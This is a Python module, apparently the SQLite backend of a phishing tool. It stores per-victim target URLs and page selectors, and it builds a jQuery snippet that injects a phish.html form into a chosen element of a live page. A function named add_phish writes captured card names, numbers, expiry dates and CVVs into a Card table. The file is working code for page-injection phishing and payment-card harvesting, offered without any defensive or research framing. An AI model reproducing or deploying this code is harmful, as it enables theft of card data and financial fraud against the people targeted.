import sqlite3

def get_phish_code(email, url):
    # print email
    # print url
    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    q = """SELECT *
    FROM Phish
    WHERE EmailIP=? AND Url=?
    """ 
    data = c.execute(q, (email.replace("\"", ""),url)).fetchall()
    conn.close()

    injectLoc = str(data[0][2])
    injectClass = str(data[0][3])
    fil = open("./static/phish.html")
    content = "$('" + injectLoc + "').first().prepend(`"+ fil.read() + "`);"
    # print content
    return content.replace("some-container-class", injectClass)

def get_phish_urls(email):
    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    q = """SELECT *
    FROM Phish
    WHERE EmailIP=?
    """ 
    data = c.execute(q, (email.replace("\"", ""),)).fetchall()
    conn.close()
    return [x[1] for x in data]

def add_phish(email, name, number, month, year, cvv): 
    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    q = """INSERT INTO Card
    Values (?, ?, ?, ?, ?, ?)"""
    c.execute(q, (email, name, number, month, year, cvv))
    conn.commit()
    conn.close()

def get_phish_by_user(email):
    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    q = """SELECT * 
    FROM Phish
    WHERE EmailIP=?"""
    data = c.execute(q, (email,)).fetchall()
    conn.commit()
    conn.close()
    return [x[1:] for x in data]

def remove_phish_url(email, url):
    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    q = """DELETE FROM Phish
    WHERE EmailIP=? AND Url=?"""
    c.execute(q, (email, url))
    conn.commit()
    conn.close()

def add_phish_url(email, url, injectLoc, injectClass):
    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    q = """INSERT INTO Phish
    Values (?,?,?,?)"""
    c.execute(q, (email, url, injectLoc, injectClass))
    conn.commit()
    conn.close()